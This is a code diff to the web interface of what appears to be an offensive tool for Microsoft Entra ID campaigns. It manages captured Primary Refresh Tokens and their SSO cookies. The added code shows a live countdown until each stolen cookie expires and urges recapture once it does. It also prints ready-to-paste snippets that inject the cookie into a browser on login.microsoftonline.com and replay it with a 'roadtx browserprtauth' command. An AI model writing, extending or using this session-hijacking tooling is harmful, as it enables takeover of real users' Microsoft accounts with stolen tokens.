@@ -1221,17 +1221,35 @@ async function loadPRTs() {
   if (!prts.length) { el.innerHTML='<div style="color:var(--text-dim);font-size:11px">No PRTs stored.</div>'; return; }
   el.innerHTML = prts.map(p=>{
     const hasKey = !!(p.session_key && p.session_key.length);
-    const useCtl = hasKey
-      ? `<div style="display:flex;gap:6px;align-items:center;margin-top:8px;flex-wrap:wrap">
+    const isCookie = !hasKey && !!(p.prt_cookie && p.prt_cookie.length);
+    const cl = isCookie ? jwtClaims(p.prt_cookie) : null;
+    const expMs = cl && cl.exp ? cl.exp*1000 : 0;
+    let useCtl;
+    if (hasKey) {
+      useCtl = `<div style="display:flex;gap:6px;align-items:center;margin-top:8px;flex-wrap:wrap">
            <select id="prtUseCamp_${escH(p.id)}" style="min-width:160px">${campOpts}</select>
            <button class="btn btn-sm btn-primary" onclick="prtUseInCampaign('${escH(p.id)}')">⚡ Use in campaign</button>
            <span id="prtUseOut_${escH(p.id)}" style="font-size:11px;color:var(--text-dim)"></span>
-         </div>`
-      : `<div style="font-size:11px;color:var(--warn);margin-top:8px">⚠ No session key stored — cannot mint tokens. Re-ingest this PRT with its session key to use it in Graph.</div>`;
+         </div>`;
+    } else if (isCookie) {
+      useCtl = `<div style="margin-top:8px;display:flex;flex-direction:column;gap:6px">
+           <div style="font-size:11px;color:var(--text-dim)">Inyección SSO en navegador · <b>no</b> acuña tokens (sin session key)</div>
+           <div id="prtFresh_${escH(p.id)}" class="prt-fresh" data-exp="${expMs}" style="font-size:11px;font-weight:600">⏱ …</div>
+           <div style="display:flex;gap:6px;flex-wrap:wrap">
+             <button class="btn btn-sm btn-primary" onclick="prtGetCookieInline('${escH(p.id)}')">📋 Cookie / inyectar</button>
+           </div>
+           <pre id="prtCookieOut_${escH(p.id)}" style="display:none;white-space:pre-wrap;word-break:break-all;font-size:10px;background:var(--accent-soft);padding:8px;border-radius:6px;margin:0"></pre>
+         </div>`;
+    } else {
+      useCtl = `<div style="font-size:11px;color:var(--warn);margin-top:8px">⚠ No session key stored — cannot mint tokens. Re-ingest this PRT with its session key to use it in Graph.</div>`;
+    }
+    const badge = isCookie
+      ? ` <span class="badge badge-yellow">🍪 cookie-only</span>`
+      : (hasKey ? ` <span class="badge badge-green">🔑 mintable</span>` : '');
     return `<div class="card" style="flex-direction:column;align-items:stretch">
       <div style="display:flex;justify-content:space-between;align-items:flex-start;gap:8px">
         <div class="card-info">
-          <div class="card-label">${escH(p.label||p.id)}</div>
+          <div class="card-label">${escH(p.label||p.id)}${badge}</div>
           <div class="card-sub">UPN: ${escH(p.target_upn||'—')} · Tenant: ${escH(p.tenant_id||'—')} · ${new Date(p.created_at).toLocaleString()}</div>
         </div>
         <div class="card-actions">
@@ -1241,6 +1259,7 @@ async function loadPRTs() {
       ${useCtl}
     </div>`;
   }).join('');
+  startPRTFreshnessTicker();
   populatePRTUseSelect();
 }
 
@@ -1309,6 +1328,56 @@ async function prtGetCookie() {
   const result = await api('GET', '/prts/'+id+'/cookie');
   if (result.error) { out.textContent='⚠ '+result.error; return; }
   out.textContent = `Cookie name: ${result.name}\nValue:\n${result.cookie}\n\nAdd to browser devtools:\ndocument.cookie = "${result.name}=${result.cookie}; domain=login.microsoftonline.com; path=/;"`;
+}
+
+// jwtClaims decodes a JWT payload (base64url, no signature verification) for
+// display hints only — used to read the `exp` of a captured PRT SSO cookie.
+function jwtClaims(tok){
+  if(!tok || tok.indexOf('.')<0) return null;
+  try{
+    let p = tok.split('.')[1].replace(/-/g,'+').replace(/_/g,'/');
+    p = p.padEnd(p.length + (4 - p.length%4)%4, '=');
+    return JSON.parse(atob(p));
+  }catch(e){ return null; }
+}
+
+// startPRTFreshnessTicker keeps every cookie-only PRT's freshness counter live
+// (a captured x-ms-RefreshTokenCredential is valid only for minutes). One shared
+// interval updates all .prt-fresh nodes; it is started once and left running.
+let _prtFreshTimer = null;
+function startPRTFreshnessTicker(){
+  tickPRTFreshness();
+  if(_prtFreshTimer) return;
+  _prtFreshTimer = setInterval(tickPRTFreshness, 1000);
+}
+function tickPRTFreshness(){
+  document.querySelectorAll('.prt-fresh').forEach(el=>{
+    const exp = parseInt(el.dataset.exp||'0',10);
+    if(!exp){ el.textContent='⏱ frescura desconocida'; el.style.color='var(--warn)'; return; }
+    const rem = Math.floor((exp - Date.now())/1000);
+    if(rem<=0){ el.innerHTML='⛔ EXPIRADO — recaptura el PRT cookie'; el.style.color='var(--accent2)'; return; }
+    const mm = Math.floor(rem/60), ss = rem%60;
+    el.textContent = '⏱ úsalo antes de '+new Date(exp).toLocaleTimeString()+' · quedan '+mm+'m '+(ss<10?'0':'')+ss+'s';
+    el.style.color = rem<60 ? 'var(--accent2)' : 'var(--warn)';
+  });
+}
+
+// prtGetCookieInline shows the captured/derived SSO cookie for one vault entry,
+// with ready-to-paste browser and roadtx injection snippets.
+async function prtGetCookieInline(id){
+  const out = document.getElementById('prtCookieOut_'+id);
+  if(out){ out.style.display='block'; out.textContent='⏳ obteniendo cookie…'; }
+  const r = await api('GET','/prts/'+id+'/cookie');
+  if(!out) return;
+  if(r.error){ out.textContent='⚠ '+r.error; return; }
+  out.textContent =
+    'name: '+r.name+'\n'+
+    'source: '+(r.source||'—')+'\n'+
+    'value:\n'+r.cookie+'\n\n'+
+    '— DevTools (en login.microsoftonline.com) —\n'+
+    'document.cookie = "'+r.name+'='+r.cookie+'; domain=login.microsoftonline.com; path=/;"\n\n'+
+    '— roadtx —\n'+
+    'roadtx browserprtauth --prt-cookie '+r.cookie;
 }
 
 // ─── WinHello ─────────────────────────────────────────────────────────────────
